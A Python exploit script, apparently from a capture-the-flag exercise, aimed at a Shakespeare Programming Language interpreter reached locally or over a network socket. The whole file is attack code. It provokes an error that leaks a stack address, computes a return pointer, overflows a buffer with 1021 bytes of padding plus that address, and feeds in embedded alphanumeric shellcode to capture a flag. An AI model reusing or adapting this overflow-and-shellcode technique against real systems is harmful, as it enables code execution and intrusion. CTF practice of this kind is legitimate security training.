import dongledingler
import random
import string
import socket
import sys
import pexpect
import pexpect.fdpexpect
import setflag

with open('include/titles.wordlist') as f:
    titles = [t.strip() for t in f.readlines()]

with open('include/scenes.wordlist') as f:
    scenes = [s.strip() for s in f.readlines()]

with open('include/character.wordlist') as f:
    names = [n.strip() for n in f.readlines()]

with open('include/descriptions.wordlist') as f:
    descriptions = [n.strip() for n in f.readlines()]

with open('/usr/share/dict/words') as f:
    words = [w.strip() for w in f.xreadlines() if w[:-1].isalpha()]

def commafy(lst):
    if len(lst) == 1: return lst[0]
    return ", ".join(lst[:-1]) + (", and " if len(lst)>2 else " and ") + lst[-1]

SHELLCODE = 'JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIpjvk2xOi2rE6ph6M1sK9ZGPhFOSC2HePqxvO0b59rNmYispRkXWxGpc0UP4orBQypn6OCCrH30bwF3K9IqjmmPAA'

def setup(ip, port, characters, scene=None):
    if ip:
        conn = socket.create_connection((ip,port))
        c = pexpect.fdpexpect.fdspawn(conn.fileno())
    else:
        c = pexpect.spawn("./spl")
        c.logfile = sys.stdout

    c.sendline(random.choice(titles) + ".\n")

    for char in characters:
        c.sendline("%s, a %s." % (char, random.choice(descriptions)))

    c.sendline("")


    c.sendline("          Act I: %s.\n" % ' '.join(random.sample(words, random.randint(1,3))).title())
    c.sendline("          Scene I: %s.\n" % scene or random.choice(scenes))


    c.sendline("[Enter %s]\n" % commafy(characters))

    return conn if ip else None, c

def exploit(ip, port):
    characters = [random.choice(names)]
    conn, c = setup(ip, port, characters)

    c.sendline(characters[0] + ":")
    c.sendline(" You are as smelly as a fat flirt-gill.")
    c.expect("Error at line \d+: Tried to assign value \((0xffff[a-f0-9]{4})\) to non-existent character\.")
    num_ptr = int(c.match.groups()[0], 16)
    ret_ptr = num_ptr-8
    print hex(num_ptr), hex(ret_ptr)
    ret_ptr_bytes = (ret_ptr>>24, (ret_ptr & 0xff0000)>>16, (ret_ptr & 0xff00)>>8, ret_ptr & 0xff)

    c.sendline("\n[Exeunt]")
    c.close()
    if ip: conn.close()

    payload = "A"*1021
    payload += ''.join([chr(c) for c in ret_ptr_bytes[::-1]])
    #tmpflag = setflag.set_flag(ip, port, "wateva", list("BB"), list(payload))

    characters = random.sample(names, 2)
    conn, c = setup(ip, port, characters, SHELLCODE)
    c.sendline(characters[0] + ":")
    c.sendline()

    # Not sure about this offset, since I made a mess in test.spl
    for x in payload[::-1]:
        c.sendline(dongledingler.shake(x))

    c.sendline("Remember the sum of a pony and a Microsoft")

    for x in range(2):
        c.sendline(dongledingler.shake('B'))

    c.sendline(characters[1] + ":")
    c.sendline(" Give me your flag!")
    c.sendline(dongledingler.shake(0x8066aa0).replace("Remember", "You are"))

    # :( :(
    c.sendline("[Exeunt]\n")

    print str(c)

    c.close()
    if ip: conn.close()

if __name__ == "__main__":
    exploit(None, None)
